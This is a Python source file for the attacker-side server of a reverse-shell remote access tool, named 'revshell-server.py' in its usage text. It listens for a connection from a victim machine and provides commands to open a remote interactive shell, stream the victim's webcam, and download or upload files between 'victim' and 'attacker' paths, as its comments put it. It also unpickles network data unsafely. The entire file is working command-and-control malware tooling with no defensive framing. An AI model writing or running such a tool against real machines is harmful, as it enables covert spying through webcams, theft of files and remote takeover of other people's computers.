import socket
import sys
import os
import signal
import cv2
import pickle
import struct
import imutils
import socket
import zlib
# import pygame
import time

# Intended to read any buffer size soon
BUFFER_SIZE = 1024 * 128

HEAD = 64

# Still not very stable, need a way to stop
# that thing and handle exceptions in case client
# SIGINTs

class WebcamStream:
	def __init__(self, client_socket):
		self.client_socket = client_socket

	def receive(self):
		data = b""
		payload_size = struct.calcsize("Q")
		while True:
			while len(data) < payload_size:
				packet = self.client_socket.recv(4 * 1024)
				if not packet:
					break
				data += packet
			packed_msg_size = data[:payload_size]
			data = data[payload_size:]
			msg_size = struct.unpack("Q", packed_msg_size)[0]
			while len(data) < msg_size:
				data += self.client_socket.recv(4 * 1024)
			frame_data = data[:msg_size]
			data = data[msg_size:]
			frame = pickle.loads(frame_data)
			cv2.imshow('Sender', frame)
			key = cv2.waitKey(10)
			if key == 13:
				return

class FileTransfer:
	def __init__(self, client_socket):
		self.client_socket = client_socket

	def download(self, file, recv_path):
		splitted = self.client_socket.recv(BUFFER_SIZE).decode().split('\n', 1)
		file_size = int(splitted[0])
		if file_size == 0:
			print(f"Could not open {file}")
			return
		data = splitted[1]
		with open(recv_path, 'w') as f:
			while file_size > 0:
				data = self.client_socket.recv(BUFFER_SIZE).decode()
				file_size -= len(data)
				f.write(data)

	def upload(self, file):
		try:
			file_size = os.stat(file).st_size
		except FileNotFoundError:
			self.client_socket.send('0'.encode())
			return
		self.client_socket.send((str(file_size) + '\n').encode())
		with open(file, 'r') as f:
			while file_size > 0:
				data = f.readline()
				file_size -= len(data)
				self.client_socket.send(data.encode())

# Shell is working client side but only
# with netcat listener.
class Shell:
	def __init__(self, client_socket):
		self.client_socket = client_socket

	def start(self):
		cmd = ''
		while(True):
			out = self.client_socket.recv(BUFFER_SIZE).decode()
			if cmd:
				sys.stdout.write(out.replace(cmd, ''))
			else:
				sys.stdout.write(out + '\n')
			try:
				cmd = input() + '\n'
			except EOFError:
				print("")
				return
			self.client_socket.send(cmd.encode())
			if cmd == 'exit\n':
				return
			time.sleep(0.01)
			# sys.stdout.write("\033[A" + cmd.split("\n")[-1])

# class ScreenStream:

# 	def __init__(self, client_socket):
# 		self.client_socket = socket

# 	def recvall(self, conn, length):
# 		buf = b''
# 		while len(buf) < length:
# 			data = self.client_socket.recv(length - len(buf))
# 			if not data:
# 				return data
# 			buf += data
# 		return buf

# 	def stream():
# 		pygame.init()
# 		screen = pygame.display.set_mode((WIDTH, HEIGHT))
# 		clock = pygame.time.Clock()
# 		watching = True    


# 		try:
# 			while watching:
# 				for event in pygame.event.get():
# 					if event.type == pygame.QUIT:
# 						watching = False
# 						break

# 				# Retreive the size of the pixels length, the pixels length and pixels
# 				size_len = int.from_bytes(conn.recv(1), byteorder='big')
# 				size = int.from_bytes(conn.recv(size_len), byteorder='big')
# 				pixels = decompress(recvall(conn, size))

# 	            # Create the Surface from raw pixels
# 				img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')

# 	            # Display the picture
# 				screen.blit(img, (0, 0))
# 				pygame.display.flip()
# 				clock.tick(60)
# 		finally:
# 			print("PIXELS: ", pixels)
# 			sock.close()


class Server:
	def __init__(self):
		try:
			port = int(sys.argv[1])
		except ValueError:
			print("The given port is not a number.\nUsage: python3 revshell-server.py <port>")
			exit(1)

		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		self.s.bind(('0.0.0.0', port))
		self.s.listen()
		print(f"Listening on 0.0.0.0:{port} ...")

	def accept(self):
		self.client_socket, client_ip = self.s.accept()
		print(f"[+] Connection from {client_ip[0]}:{client_ip[1]}")

	def send(self, msg):
		msg = msg.encode()
		if len(str(len(msg))) > HEAD:
			print("[!] Message too long.\n[!] The last message hasn't been sent")
		try:
			msg_size = str(len(msg)).encode()
			msg_size += b' ' * (HEAD - len(msg_size))
			self.client_socket.sendall(msg_size)
			self.client_socket.sendall(msg)
		except:
			print("[!] Failed to transfer data on socket.\n"
				"[!] The shell might be unstable !")

	def recvall(self, size):
		ret = ''
		while len(ret) < size:
			ret += self.client_socket.recv(size).decode()
		return ret
	
	def recv(self):
		msg_size = int(self.recvall(HEAD))
		return self.recvall(msg_size).decode()

	def get_client_socket(self):
		return self.client_socket

	def __del__(self):
		try:
			self.client_socket.close()
		except:
			pass
		self.s.close()


def main_loop(server, client_socket):
	while True:
		try:
			cmd = input("revshell> ")
		except EOFError:
			print("")
			return
		if not cmd:
			return
		cmd = cmd.strip()
		if not cmd:
			continue
		if cmd.split()[0] == "shell":
			client_socket.send(cmd.encode())
			shell = Shell(client_socket)
			signal.signal(signal.SIGINT, signal.SIG_IGN)
			shell.start()
			signal.signal(signal.SIGINT, sigIntHandler)
		elif cmd.split()[0] == "webcam":
			client_socket.send(cmd.encode())
			webcam = WebcamStream(client_socket)
			webcam.receive()
		elif cmd.split(" ")[0] == "download":
			# Usage: download <file_of_victim> <path_of_attacker>
			client_socket.send(("download " + cmd.split(" ")[1]).encode())
			transfer = FileTransfer(client_socket)
			transfer.download(cmd.split(" ")[1], cmd.split(" ")[2])
		elif cmd.split(" ")[0] == "upload":
			# Usage: download <file_of_attacker> <path_of_victim>
			client_socket.send(("upload " + cmd.split(" ", 2)[2]).encode())
			transfer = FileTransfer(client_socket)
			transfer.upload(cmd.split(" ")[1])
		elif cmd == "exit":
			client_socket.send("exit".encode())
			return

def sigIntHandler(signum, frame):
	print("\nrevshell> ", end="")


def main():
	server = Server()
	server.accept()
	signal.signal(signal.SIGINT, sigIntHandler)
	main_loop(server, server.get_client_socket())
	

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("Usage: python3 revshell-server.py <port>")
		exit(1)
	main()